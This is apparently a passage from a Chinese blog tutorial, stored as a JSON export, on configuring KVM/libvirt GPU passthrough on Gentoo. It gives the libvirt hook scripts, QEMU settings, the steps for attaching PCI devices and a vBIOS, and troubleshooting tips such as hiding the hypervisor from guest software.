/var/log/libvirt/custom_hooks.log<br>                /bin/vfio-startup.sh 2&gt;&amp;1 | <span class=\"hljs-built_in\">tee</span> -a /var/log/libvirt/custom_hooks.log<br>                ;;<br><br>            <span class=\"hljs-string\">&quot;release&quot;</span>)<br>                systemctl stop libvirt-nosleep@<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$OBJECT</span>&quot;</span>  2&gt;&amp;1 | <span class=\"hljs-built_in\">tee</span> -a /var/log/libvirt/custom_hooks.log<br>                /bin/vfio-teardown.sh 2&gt;&amp;1 | <span class=\"hljs-built_in\">tee</span> -a /var/log/libvirt/custom_hooks.log<br>                ;;<br>        <span class=\"hljs-keyword\">esac</span><br><span class=\"hljs-keyword\">fi</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">worisur /etc/libvirt/hooks <span class=\"hljs-comment\"># cat vfio-startup.sh</span><br><span class=\"hljs-comment\">#!/bin/bash</span><br><span class=\"hljs-comment\"># Helpful to read output when debugging</span><br><span class=\"hljs-built_in\">set</span> -x<br><br>long_delay=10<br>medium_delay=5<br>short_delay=1<br><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;Beginning of startup!&quot;</span><br><br><span class=\"hljs-keyword\">function</span> stop_display_manager_if_running &#123;<br>    <span class=\"hljs-comment\"># Stop dm using systemd</span><br>    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">command</span> -v systemctl; <span class=\"hljs-keyword\">then</span><br>        <span class=\"hljs-keyword\">if</span> systemctl is-active --quiet <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$1</span>.service&quot;</span> ; <span class=\"hljs-keyword\">then</span><br>            <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$1</span> &gt;&gt; /tmp/vfio-store-display-manager<br>            systemctl stop <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$1</span>.service&quot;</span><br>        <span class=\"hljs-keyword\">fi</span><br><br>        <span class=\"hljs-keyword\">while</span> systemctl is-active --quiet <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$1</span>.service&quot;</span> ; <span class=\"hljs-keyword\">do</span><br>            <span class=\"hljs-built_in\">sleep</span> <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;medium_delay&#125;</span>&quot;</span><br>        <span class=\"hljs-keyword\">done</span><br><br>        <span class=\"hljs-built_in\">return</span><br>    <span class=\"hljs-keyword\">fi</span><br><br>    <span class=\"hljs-comment\"># Stop dm using runit</span><br>    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">command</span> -v sv; <span class=\"hljs-keyword\">then</span><br>        <span class=\"hljs-keyword\">if</span> sv status <span class=\"hljs-variable\">$1</span> ; <span class=\"hljs-keyword\">then</span><br>            <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$1</span> &gt;&gt; /tmp/vfio-store-display-manager<br>            sv stop <span class=\"hljs-variable\">$1</span><br>        <span class=\"hljs-keyword\">fi</span><br>    <span class=\"hljs-keyword\">fi</span><br>&#125;<br><br><span class=\"hljs-comment\"># Stop currently running display manager</span><br><span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">test</span> -e <span class=\"hljs-string\">&quot;/tmp/vfio-store-display-manager&quot;</span> ; <span class=\"hljs-keyword\">then</span><br>    <span class=\"hljs-built_in\">rm</span> -f /tmp/vfio-store-display-manager<br><span class=\"hljs-keyword\">fi</span><br><br>stop_display_manager_if_running gdm<br>stop_display_manager_if_running display-manager<br><br><span class=\"hljs-built_in\">sleep</span> <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;medium_delay&#125;</span>&quot;</span><br><br><span class=\"hljs-comment\"># Unbind VTconsoles if currently bound (adapted from https://www.kernel.org/doc/Documentation/fb/fbcon.txt)</span><br><span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">test</span> -e <span class=\"hljs-string\">&quot;/tmp/vfio-bound-consoles&quot;</span> ; <span class=\"hljs-keyword\">then</span><br>    <span class=\"hljs-built_in\">rm</span> -f /tmp/vfio-bound-consoles<br><span class=\"hljs-keyword\">fi</span><br><span class=\"hljs-keyword\">for</span> (( i = 0; i &lt; 16; i++))<br><span class=\"hljs-keyword\">do</span><br>  <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">test</span> -x /sys/class/vtconsole/vtcon<span class=\"hljs-variable\">$&#123;i&#125;</span>; <span class=\"hljs-keyword\">then</span><br>      <span class=\"hljs-keyword\">if</span> [ `<span class=\"hljs-built_in\">cat</span> /sys/class/vtconsole/vtcon<span class=\"hljs-variable\">$&#123;i&#125;</span>/name | grep -c <span class=\"hljs-string\">&quot;frame buffer&quot;</span>` \\<br>           = 1 ]; <span class=\"hljs-keyword\">then</span><br>               <span class=\"hljs-built_in\">echo</span> 0 &gt; /sys/class/vtconsole/vtcon<span class=\"hljs-variable\">$&#123;i&#125;</span>/bind<br>           <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;Unbinding console <span class=\"hljs-variable\">$&#123;i&#125;</span>&quot;</span><br>           <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$i</span> &gt;&gt; /tmp/vfio-bound-consoles<br>      <span class=\"hljs-keyword\">fi</span><br>  <span class=\"hljs-keyword\">fi</span><br><span class=\"hljs-keyword\">done</span><br><br><span class=\"hljs-comment\"># Unbind EFI-Framebuffer</span><br><span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">test</span> -e <span class=\"hljs-string\">&quot;/tmp/vfio-is-nvidia&quot;</span> ; <span class=\"hljs-keyword\">then</span><br>    <span class=\"hljs-built_in\">rm</span> -f /tmp/vfio-is-nvidia<br><span class=\"hljs-keyword\">fi</span><br><br><span class=\"hljs-keyword\">if</span> lsmod | grep <span class=\"hljs-string\">&quot;nvidia&quot;</span> &amp;&gt; /dev/null ; <span class=\"hljs-keyword\">then</span><br>    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;true&quot;</span> &gt;&gt; /tmp/vfio-is-nvidia<br>    <span class=\"hljs-built_in\">echo</span> efi-framebuffer.0 &gt; /sys/bus/platform/drivers/efi-framebuffer/unbind<br><span class=\"hljs-keyword\">fi</span><br><br><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;End of startup!&quot;</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">worisur /etc/libvirt/hooks <span class=\"hljs-comment\"># cat vfio-teardown.sh</span><br><span class=\"hljs-comment\">#!/bin/bash</span><br><span class=\"hljs-built_in\">set</span> -x<br><br><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;Beginning of teardown!&quot;</span><br><br><span class=\"hljs-built_in\">sleep</span> 10<br><br><span class=\"hljs-comment\"># Restart Display Manager</span><br>input=<span class=\"hljs-string\">&quot;/tmp/vfio-store-display-manager&quot;</span><br><span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> displayManager; <span class=\"hljs-keyword\">do</span><br>  <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">command</span> -v systemctl; <span class=\"hljs-keyword\">then</span><br>    systemctl start <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$displayManager</span>.service&quot;</span><br>  <span class=\"hljs-keyword\">else</span><br>    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">command</span> -v sv; <span class=\"hljs-keyword\">then</span><br>      sv start <span class=\"hljs-variable\">$displayManager</span><br>    <span class=\"hljs-keyword\">fi</span><br>  <span class=\"hljs-keyword\">fi</span><br><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$input</span>&quot;</span><br><br><span class=\"hljs-comment\"># Rebind VT consoles (adapted from https://www.kernel.org/doc/Documentation/fb/fbcon.txt)</span><br>input=<span class=\"hljs-string\">&quot;/tmp/vfio-bound-consoles&quot;</span><br><span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> consoleNumber; <span class=\"hljs-keyword\">do</span><br>  <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">test</span> -x /sys/class/vtconsole/vtcon<span class=\"hljs-variable\">$&#123;consoleNumber&#125;</span>; <span class=\"hljs-keyword\">then</span><br>      <span class=\"hljs-keyword\">if</span> [ `<span class=\"hljs-built_in\">cat</span> /sys/class/vtconsole/vtcon<span class=\"hljs-variable\">$&#123;consoleNumber&#125;</span>/name | grep -c <span class=\"hljs-string\">&quot;frame buffer&quot;</span>` \\<br>           = 1 ]; <span class=\"hljs-keyword\">then</span><br>    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;Rebinding console <span class=\"hljs-variable\">$&#123;consoleNumber&#125;</span>&quot;</span><br>          <span class=\"hljs-built_in\">echo</span> 1 &gt; /sys/class/vtconsole/vtcon<span class=\"hljs-variable\">$&#123;consoleNumber&#125;</span>/bind<br>      <span class=\"hljs-keyword\">fi</span><br>  <span class=\"hljs-keyword\">fi</span><br><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$input</span>&quot;</span><br><br><span class=\"hljs-comment\"># Rebind framebuffer for nvidia</span><br><span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">test</span> -e <span class=\"hljs-string\">&quot;/tmp/vfio-is-nvidia&quot;</span> ; <span class=\"hljs-keyword\">then</span><br>  <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;efi-framebuffer.0&quot;</span> &gt; /sys/bus/platform/drivers/efi-framebuffer/bind<br><span class=\"hljs-keyword\">fi</span><br><br><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;End of teardown!&quot;</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 权限为 kvm 用户 组为 libvirt</span><br>worisur /etc/libvirt/hooks <span class=\"hljs-comment\"># ls -al</span><br>总用量 20<br>drwxr-xr-x 2 miloo libvirt 4096  7月 14 23:35 .<br>drwxr-xr-x 7 root  root    4096  7月 13 01:25 ..<br>-rwxr-xr-x 1 miloo libvirt  622  7月 14 23:32 qemu<br>-rwxr-xr-x 1 miloo libvirt 1981  7月 13 02:06 vfio-startup.sh<br>-rwxr-xr-x 1 miloo libvirt  972  7月 13 02:07 vfio-teardown.sh<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-5-QEMU-配置\"><a href=\"#2-5-QEMU-配置\" class=\"headerlink\" title=\"2.5 QEMU 配置\"></a>2.5 QEMU 配置</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># /etc/libvirt/libvirtd.conf 修改如下行：</span><br>worisur /etc/libvirt <span class=\"hljs-comment\"># cat libvirtd.conf</span><br>unix_sock_group = <span class=\"hljs-string\">&quot;libvirt&quot;</span><br>unix_sock_rw_perms = <span class=\"hljs-string\">&quot;0770&quot;</span><br>log_filters=<span class=\"hljs-string\">&quot;1:qemu&quot;</span><br>log_outputs=<span class=\"hljs-string\">&quot;1:file:/var/log/libvirt/libvirtd.log&quot;</span><br><br><span class=\"hljs-comment\"># # /etc/libvirt/qemu.conf 修改如下行：</span><br>worisur /etc/libvirt <span class=\"hljs-comment\"># cat qemu.conf</span><br>user = <span class=\"hljs-string\">&quot;miloo&quot;</span><br>group = <span class=\"hljs-string\">&quot;libvirt&quot;</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"3-直通\"><a href=\"#3-直通\" class=\"headerlink\" title=\"3 直通\"></a>3 直通</h1><h2 id=\"3-1-创建不直通的虚拟机\"><a href=\"#3-1-创建不直通的虚拟机\" class=\"headerlink\" title=\"3.1 创建不直通的虚拟机\"></a>3.1 创建不直通的虚拟机</h2><ul>\n<li>下载<a href=\"https://github.com/virtio-win/virtio-win-pkg-scripts/blob/master/README.md\">驱动</a></li>\n<li>芯片组：Q35</li>\n<li>固件：ovmf_code.fd</li>\n</ul>\n<h2 id=\"3-2-vbios\"><a href=\"#3-2-vbios\" class=\"headerlink\" title=\"3.2 vbios\"></a>3.2 vbios</h2><p><a href=\"http://www.xiaobaixitong.com/help/43692.html\">gpuz提取</a></p>\n<p><a href=\"https://www.techpowerup.com/vgabios/?architecture=&manufacturer=&model=RX+6800+XT&interface=&memType=&memSize=&since=\">此处下载</a></p>\n<h2 id=\"3-3-添加直通设备\"><a href=\"#3-3-添加直通设备\" class=\"headerlink\" title=\"3.3 添加直通设备\"></a>3.3 添加直通设备</h2><ol>\n<li>打开虚拟机管理器,把显卡的所有pci部分都添加到虚拟机里面。<blockquote>\n<p>pci设备：1002:73bf,1002:ab28,1002:73a6,1002:73a4,1002:1478,1002:1479</p>\n</blockquote>\n</li>\n<li>启用XML编辑, 在显卡的所有pci设备里面, 在</source>之后添加: <code>&lt;rom bar=&quot;on&quot; file=&quot;vbios路径&quot;/&gt;</code></li>\n<li>把串口,显示协议,信道,usb转接,显卡qxl,触摸板那些东西删掉</li>\n<li>添加你的USB设备,比如鼠标、键盘和USB耳机。</li>\n</ol>\n<h1 id=\"4-问题解决\"><a href=\"#4-问题解决\" class=\"headerlink\" title=\"4 问题解决\"></a>4 问题解决</h1><h2 id=\"4-1-软件不能运行在虚拟机上-Sorry-this-program-cannot-run-under-a-virtual-machine\"><a href=\"#4-1-软件不能运行在虚拟机上-Sorry-this-program-cannot-run-under-a-virtual-machine\" class=\"headerlink\" title=\"4.1 软件不能运行在虚拟机上(Sorry, this program cannot run under a virtual machine)\"></a>4.1 软件不能运行在虚拟机上(Sorry, this program cannot run under a virtual machine)</h2><ul>\n<li>Pass the SMBIOS information to the guest</li>\n<li>Pass the exact host’s CPU model to the guest</li>\n<li>Hide the “hypervisor” feature from the CPU</li>\n<li>In the “features &gt; hyperv” section, add a vendor_id</li>\n<li>In the “features” section, hide kvm.</li>\n</ul>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">os</span>&gt;</span><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">smbios</span> <span class=\"hljs-attr\">mode</span>=<span class=\"hljs-string\">&#x27;host&#x27;</span>/&gt;</span><br>  ...<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">os</span>&gt;</span><br>...<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">features</span>&gt;</span><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">hyperv</span>&gt;</span><br>    ...<br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">vendor_id</span> <span class=\"hljs-attr\">state</span>=<span class=\"hljs-string\">&#x27;on&#x27;</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&#x27;123456789ab&#x27;</span>/&gt;</span><br>  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">hyperv</span>&gt;</span><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">kvm</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">hidden</span> <span class=\"hljs-attr\">state</span>=<span class=\"hljs-string\">&#x27;on&#x27;</span>/&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">hint-dedicated</span> <span class=\"hljs-attr\">state</span>=<span class=\"hljs-string\">&#x27;on&#x27;</span>/&gt;</span><br>  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">kvm</span>&gt;</span><br>  ...<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">features</span>&gt;</span><br>...<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">cpu</span> <span class=\"hljs-attr\">mode</span>=<span class=\"hljs-string\">&#x27;host-passthrough&#x27;</span>&gt;</span><br>  ...<br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">feature</span> <span class=\"hljs-attr\">policy</span>=<span class=\"hljs-string\">&#x27;disable&#x27;</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&#x27;hypervisor&#x27;</span>/&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">cpu</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"4-2-黑屏-ucsi-cgg-1-0008-ucsi-handle-connector-change-GET-CONNECTOR-STATUS-failed\"><a href=\"#4-2-黑屏-ucsi-cgg-1-0008-ucsi-handle-connector-change-GET-CONNECTOR-STATUS-failed\" class=\"headerlink\" title=\"4.2 黑屏(ucsi_cgg 1-0008: ucsi_handle_connector_change: GET_CONNECTOR_STATUS failed)\"></a>4.2 黑屏(ucsi_cgg 1-0008: ucsi_handle_connector_change: GET_CONNECTOR_STATUS failed)</h2><ul>\n<li><code>ucsi_cgg</code> 为英伟达显卡的 <code>mod</code> 直接屏蔽就好</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">/etc/modprobe.d <span class=\"hljs-comment\"># cat blacklist-nvidia-usb.conf</span><br>blacklist ucsi_ccg<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"4-2-docker-桥接占用物理网卡导致网络不通的情况\"><a href=\"#4-2-docker-桥接占用物理网卡导致网络不通的情况\" class=\"headerlink\" title=\"4.2 docker 桥接占用物理网卡导致网络不通的情况\"></a>4.2 docker 桥接占用物理网卡导致网络不通的情况</h2><ul>\n<li>添加或修改 <code>/etc/docker/daemon.json</code> 将 kvm 的桥接网卡直接赋给 docker</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">&#123;<br>  <span class=\"hljs-string\">&quot;bridge&quot;</span>: <span class=\"hljs-string\">&quot;virbr&quot;</span>,<br>  <span class=\"hljs-string\">&quot;default-gateway&quot;</span>: <span class=\"hljs-string\">&quot;*.*.*.*&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>\n","site":{"data":{}},"wordcount":10708,"more":"<ul>\n<li><a href=\"#1-%E5%AE%89%E8%A3%85\">1 安装</a></li>\n<li><a href=\"#2-%E9%85%8D%E7%BD%AE\">2 配置</a><ul>\n<li><a href=\"#21-%E6%A1%A5%E6%8E%A5\">2.1 桥接</a></li>\n<li><a href=\"#22-iommu\">2.2 iommu</a></li>\n<li><a href=\"#23-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E6%B7%BB%E5%8A%A0\">2.3 内核模块添加</a></li>\n<li><a href=\"#24-hook-%E8%84%9A%E6%9C%AC\">2.4 hook 脚本</a></li>\n<li><a href=\"#25-qemu-%E9%85%8D%E7%BD%AE\">2.5 QEMU 配置</a></li>\n</ul>\n</li>\n<li><a href=\"#3-%E7%9B%B4%E9%80%9A\">3 直通</a><ul>\n<li><a href=\"#31-%E5%88%9B%E5%BB%BA%E4%B8%8D%E7%9B%B4%E9%80%9A%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA\">3.1 创建不直通的虚拟机</a></li>\n<li><a href=\"#32-vbios\">3.2 vbios</a></li>\n<li><a href=\"#33-%E6%B7%BB%E5%8A%A0%E7%9B%B4%E9%80%9A%E8%AE%BE%E5%A4%87\">3.3 添加直通设备</a></li>\n</ul>\n</li>\n<li><a href=\"#4-%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3\">4 问题解决</a><ul>\n<li><a href=\"#41-%E8%BD%AF%E4%BB%B6%E4%B8%8D%E8%83%BD%E8%BF%90%E8%A1%8C%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8Asorry-this-program-cannot-run-under-a-virtual-machine\">4.1 软件不能运行在虚拟机上(Sorry, this program cannot run under a virtual machine)</a></li>\n<li><a href=\"#42-%E9%BB%91%E5%B1%8Fucsi_cgg-1-0008-ucsi_handle_connector_change-get_connector_status-failed\">4.2 黑屏(ucsi_cgg 1-0008: ucsi_handle_connector_change: GET_CONNECTOR_STATUS failed)</a></li>\n<li><a href=\"#42-docker-%E6%A1%A5%E6%8E%A5%E5%8D%A0%E7%94%A8%E7%89%A9%E7%90%86%E7%BD%91%E5%8D%A1%E5%AF%BC%E8%87%B4%E7%BD%91%E7%BB%9C%E4%B8%8D%E9%80%9A%E7%9A%84%E6%83%85%E5%86%B5\">4.2 docker 桥接占用物理网卡导致网络不通的情况</a></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"1-安装\"><a href=\"#1-安装\" class=\"headerlink\" title=\"1 安装\"></a>1 安装</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">app-emulation/qemu<br>app-emulation/libvirt<br>app-emulation/virt-manager<br>net-misc/bridge-utils<br>sys-firmware/edk2-ovmf<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">usermod -a -G libvirt miloo<br>usermod -a -G kvm miloo <br>systemctl <span class=\"hljs-built_in\">enable</span> libvirtd<br>systemctl <span class=\"hljs-built_in\">enable</span> virtlogd-admin.socket<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"2-配置\"><a href=\"#2-配置\" class=\"headerlink\" title=\"2 配置\"></a>2 配置</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">worisur ~ <span class=\"hljs-comment\"># neofetch</span><br>         -/oyddmdhs+:.                root@worisur<br>     -odNMMMMMMMMNNmhy+-`             ------------<br>   -yNMMMMMMMMMMMNNNmmdhy+-           OS: Gentoo Base System release 2.8 x86_64<br> `omMMMMMMMMMMMMNmdmmmmddhhy/`        Kernel: 5.15.52-gentoo-dist<br> omMMMMMMMMMMMNhhyyyohmdddhhhdo`      Uptime: 19 hours, 43 mins<br>.ydMMMMMMMMMMdhs++so/smdddhhhhdm+`    Packages: 975 (emerge)<br> oyhdmNMMMMMMMNdyooydmddddhhhhyhNd.   Shell: bash 5.1.16<br>  :oyhhdNNMMMMMMMNNNmmdddhhhhhyymMh   Terminal: /dev/pts/0<br>    .:+sydNMMMMMNNNmmmdddhhhhhhmMmy   CPU: AMD Ryzen 9 5900X (24) @ 3.700GHz<br>       /mMMMMMMNNNmmmdddhhhhhmMNhs:   GPU: AMD ATI Radeon RX 6800/6800 XT / 6900 XT<br>    `oNMMMMMMMNNNmmmddddhhdmMNhs+`    Memory: 33068MiB / 64220MiB<br>  `sNMMMMMMMMNNNmmmdddddmNMmhs/.<br> /NMMMMMMMMNNNNmmmdddmNMNdso:`<br>+MMMMMMMNNNNNmmmmdmNMNdso/-<br>yMMNNNNNNNmmmmmNNMmhs+/-`<br>/hMMNNNNNNNNMNdhs++/-`<br>`/ohdmmddhys+++/:.`<br>  `-//////:--.<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-1-桥接\"><a href=\"#2-1-桥接\" class=\"headerlink\" title=\"2.1 桥接\"></a>2.1 桥接</h2><p><a href=\"https://blog.51cto.com/u_3823536/2547591\">无线网卡看这里</a></p>\n<p><a href=\"https://support.huaweicloud.com/dpmg-kunpengwebs/kunpengtomee_04_0008.html\">brctl配置看这里</a></p>\n<ul>\n<li>我的做法:</li>\n</ul>\n<p>NetworkManager 直接使用 <code>nmtui</code> 将需要桥接的网卡加进新建的网桥(并将该网卡的mac地址配置给网桥),然后给网桥配置静态的地址(配置方式和普通网卡没区别),设置开机启动</p>\n<h2 id=\"2-2-iommu\"><a href=\"#2-2-iommu\" class=\"headerlink\" title=\"2.2 iommu\"></a>2.2 iommu</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">cat</span> /etc/default/grub<br><span class=\"hljs-comment\"># 添加如下行</span><br><span class=\"hljs-comment\"># AMD处理器(根据BIOS设置默认已启用？)：amd_iommu=on</span><br><span class=\"hljs-comment\"># 